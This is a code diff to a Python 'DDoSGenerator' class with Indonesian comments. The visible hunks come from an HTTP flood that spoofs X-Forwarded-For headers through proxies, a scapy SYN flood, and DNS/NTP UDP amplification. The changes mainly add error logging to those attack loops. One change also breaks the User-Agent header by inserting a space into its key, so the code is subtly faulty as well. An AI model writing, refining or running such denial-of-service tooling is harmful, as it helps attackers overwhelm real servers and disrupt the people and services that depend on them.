@@ -2,7 +2,7 @@ import asyncio
 import aiohttp
 import socket
 import random
-import time
+import os
 from scapy.all import *
 from concurrent.futures import ThreadPoolExecutor
 
@@ -40,7 +40,7 @@ class DDoSGenerator:
     async def http_flood(self):
         """Serangan Layer 7 Asynchronous"""
         headers = {
-            "User-Agent": random.choice(self.user_agents),
+            "User -Agent": random.choice(self.user_agents),
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Referer": f"http://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
             "X-Forwarded-For": f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
@@ -60,8 +60,8 @@ class DDoSGenerator:
                             ssl=False
                         ) as response:
                             print(f"HTTP {response.status} | Via: {proxy}")
-                    except:
-                        pass
+                    except Exception as e:
+                        print(f"HTTP Flood error: {str(e)}")
         except Exception as e:
             print(f"Connection error: {str(e)}")
 
@@ -78,8 +78,8 @@ class DDoSGenerator:
                     flags="S"
                 )
                 send(packet, verbose=0)
-            except:
-                pass
+            except Exception as e:
+                print(f"TCP Flood error: {str(e)}")
 
     def udp_amplification(self):
         """Teknik Amplifikasi DNS/NTP"""
@@ -91,8 +91,8 @@ class DDoSGenerator:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.sendto(payload, (random.choice(dns_servers), 53))
                 sock.close()
-            except:
-                pass
+            except Exception as e:
+                print(f"UDP Amplification error: {str(e)}")
 
     async def start_attack(self):
         """Mulai semua jenis serangan"""
